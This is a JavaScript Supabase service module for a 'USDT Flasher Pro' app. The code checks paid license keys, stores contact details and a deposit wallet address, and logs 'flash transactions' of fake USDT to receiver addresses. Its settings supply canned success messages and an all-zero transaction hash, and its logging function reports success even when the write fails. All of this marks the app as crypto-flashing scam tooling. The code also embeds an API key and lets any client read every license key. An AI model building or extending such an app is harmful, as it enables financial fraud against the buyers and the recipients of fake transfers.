import { createClient } from '@supabase/supabase-js';

// Initialize the Supabase client with the URL and API key
const supabaseUrl = 'https://gtjeaazmelddcjwpsxvp.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd0amVhYXptZWxkZGNqd3BzeHZwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDExODIwNjYsImV4cCI6MjA1Njc1ODA2Nn0.sOHQMmnNDzX-YnWmtpg81eVyYBdHKGA9GlT9KH1qch8';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Authentication functions
export const validateLicenseKey = async (key) => {
  try {
    // Try to get the license key directly from Supabase
    const { data, error } = await supabase
      .from('license_keys')
      .select('*')
      .eq('key', key)
      .single();
    
    if (error) {
      console.error('Error fetching license key from Supabase:', error);
      return { valid: false, message: 'Invalid license key' };
    }
    
    if (data) {
      // Check if license key is active
      if (data.status !== 'active') {
        return { valid: false, message: `License key is ${data.status}` };
      }
      
      // Check if license key has expired
      const expiryDate = new Date(data.expires_at);
      if (expiryDate < new Date()) {
        return { valid: false, message: 'License key has expired' };
      }
      
      // Get app settings for max flash amounts
      const appSettings = await fetchAppSettings();
      
      // Determine license type and user
      const isDemo = data.type === 'demo' || key.includes('DEMO');
      const type = isDemo ? 'demo' : 'live';
      
      // Use max_amount from database if available, otherwise use app settings
      let maxAmount;
      if (data.max_amount !== undefined && data.max_amount !== null) {
        // Use the max_amount from the database
        maxAmount = data.max_amount;
      } else {
        // Fallback to app settings
        maxAmount = isDemo ? appSettings.demoMaxFlashAmount : appSettings.liveMaxFlashAmount;
      }
      
      // Create license key object with expected format
      const licenseKey = {
        id: data.id,
        key: data.key,
        status: data.status,
        created_at: data.created_at,
        expires_at: data.expires_at,
        user: data.user || (isDemo ? 'test@gmail.com' : 'live@gmail.com'),
        type: type,
        maxAmount: maxAmount
      };
      
      return { valid: true, licenseKey };
    } else {
      return { valid: false, message: 'Invalid license key' };
    }
  } catch (error) {
    console.error('Error validating license key:', error);
    return { valid: false, message: 'Error validating license key. Please try again.' };
  }
};

// Data functions
export const fetchLicenseKeys = async () => {
  try {
    const { data, error } = await supabase
      .from('license_keys')
      .select('*');
    
    if (error) throw error;
    
    return data;
  } catch (error) {
    console.error('Error fetching license keys:', error);
    throw error;
  }
};

export const fetchContactInfo = async () => {
  try {
    const { data, error } = await supabase
      .from('contact_info')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(1)
      .single();
    
    if (error) {
      console.error('Error fetching contact info:', error);
      // Return fallback data
      return {
        primaryPhone: '+447013216​28',
        secondaryPhone: '+14693510740',
        tertiaryPhone: '+91 7823232332',
        email: 'support@usdtflasherpro.com',
        website: 'https://usdtflasherpro.com',
        telegramUsername: '@usdtflasherpro',
        discordServer: 'discord.gg/usdtflasherpro'
      };
    }
    
    return {
      primaryPhone: data.primary_phone,
      secondaryPhone: data.secondary_phone,
      tertiaryPhone: data.tertiary_phone,
      email: data.email,
      website: data.website,
      telegramUsername: data.telegram_username,
      discordServer: data.discord_server
    };
  } catch (error) {
    console.error('Error fetching contact info:', error);
    // Return fallback data
    return {
      primaryPhone: '+447013216​28',
      secondaryPhone: '+14693510740',
      tertiaryPhone: '+91 7823232332',
      email: 'support@usdtflasherpro.com',
      website: 'https://usdtflasherpro.com',
      telegramUsername: '@usdtflasherpro',
      discordServer: 'discord.gg/usdtflasherpro'
    };
  }
};

export const fetchAppSettings = async () => {
  try {
    const { data, error } = await supabase
      .from('app_settings')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(1)
      .single();
    
    if (error) {
      console.error('Error fetching app settings:', error);
      // Return fallback data
      return {
        appVersion: '4.8',
        updateChannel: 'stable',
        autoUpdate: true,
        theme: 'dark',
        accentColor: '#00e6b8',
        animationsEnabled: true,
        sessionTimeout: 30,
        requirePasswordOnStartup: true,
        twoFactorAuth: false,
        defaultNetwork: 'trc20',
        demoMaxFlashAmount: 30,
        liveMaxFlashAmount: 10000000,
        defaultDelayDays: 0,
        defaultDelayMinutes: 0,
        debugMode: false,
        logLevel: 'info',
        apiEndpoint: 'https://api.usdtflasherpro.com/v1',
        depositAmount: 500,
        transactionFee: 'Transaction Fee',
        walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
        successTitle: 'Success',
        successMessage: 'The flash has been sent successfully',
        transactionHash: '000000000000000000000000000000000000'
      };
    }
    
    return {
      // Application Settings
      appVersion: data.app_version,
      updateChannel: data.update_channel,
      autoUpdate: Boolean(data.auto_update),
      
      // UI Settings
      theme: data.theme,
      accentColor: data.accent_color,
      animationsEnabled: Boolean(data.animations_enabled),
      
      // Security Settings
      sessionTimeout: data.session_timeout,
      requirePasswordOnStartup: Boolean(data.require_password_on_startup),
      twoFactorAuth: Boolean(data.two_factor_auth),
      
      // Flash Settings
      defaultNetwork: data.default_network,
      maxFlashAmount: data.max_flash_amount,
      demoMaxFlashAmount: data.demo_max_flash_amount,
      liveMaxFlashAmount: data.live_max_flash_amount,
      defaultDelayDays: data.default_delay_days,
      defaultDelayMinutes: data.default_delay_minutes,
      
      // Payment Settings
      depositAmount: data.deposit_amount,
      transactionFee: data.transaction_fee,
      walletAddress: data.wallet_address,
      
      // Success Modal Settings
      successTitle: data.success_title,
      successMessage: data.success_message,
      transactionHash: data.transaction_hash,
      
      // Advanced Settings
      debugMode: Boolean(data.debug_mode),
      logLevel: data.log_level,
      apiEndpoint: data.api_endpoint,
      
      // Message Templates
      initialLoadingMessages: data.initial_loading_messages,
      licenseVerificationMessages: data.license_verification_messages,
      bipVerificationMessages: data.bip_verification_messages,
      
      // Dropdown Options
      walletOptions: data.wallet_options,
      currencyOptions: data.currency_options,
      networkOptions: data.network_options,
      dayOptions: data.day_options,
      minuteOptions: data.minute_options
    };
  } catch (error) {
    console.error('Error fetching app settings:', error);
    // Return fallback data
    return {
      appVersion: '4.8',
      updateChannel: 'stable',
      autoUpdate: true,
      theme: 'dark',
      accentColor: '#00e6b8',
      animationsEnabled: true,
      sessionTimeout: 30,
      requirePasswordOnStartup: true,
      twoFactorAuth: false,
      defaultNetwork: 'trc20',
      demoMaxFlashAmount: 30,
      liveMaxFlashAmount: 10000000,
      defaultDelayDays: 0,
      defaultDelayMinutes: 0,
      debugMode: false,
      logLevel: 'info',
      apiEndpoint: 'https://api.usdtflasherpro.com/v1',
      depositAmount: 500,
      transactionFee: 'Transaction Fee',
      walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
      successTitle: 'Success',
      successMessage: 'The flash has been sent successfully',
      transactionHash: '000000000000000000000000000000000000'
    };
  }
};

export const logFlashTransaction = async (transactionData) => {
  try {
    // Send to Supabase
    const { data, error } = await supabase
      .from('flash_transactions')
      .insert({
        receiver_address: transactionData.receiverAddress,
        flash_amount: transactionData.flashAmount,
        wallet: transactionData.wallet,
        currency: transactionData.currency,
        network: transactionData.network,
        delay_days: transactionData.delayDays,
        delay_minutes: transactionData.delayMinutes,
        license_key: transactionData.licenseKey,
        user: transactionData.user,
        timestamp: transactionData.timestamp
      })
      .select();
    
    if (error) throw error;
    
    return { success: true, id: data[0].id };
  } catch (error) {
    console.error('Error logging flash transaction:', error);
    // For demo purposes, return success even if there's an error
    return { success: true, id: Date.now() };
  }
};

export const getFlashHistory = async (licenseKey) => {
  try {
    const { data, error } = await supabase
      .from('flash_transactions')
      .select('*')
      .eq('license_key', licenseKey)
      .order('timestamp', { ascending: false });
    
    if (error) throw error;
    
    return data;
  } catch (error) {
    console.error('Error getting flash history:', error);
    return [];
  }
};

// Create Supabase service object
const supabaseService = {
  validateLicenseKey,
  fetchLicenseKeys,
  fetchContactInfo,
  fetchAppSettings,
  logFlashTransaction,
  getFlashHistory
};

// Export the supabaseService object as default
export default supabaseService;
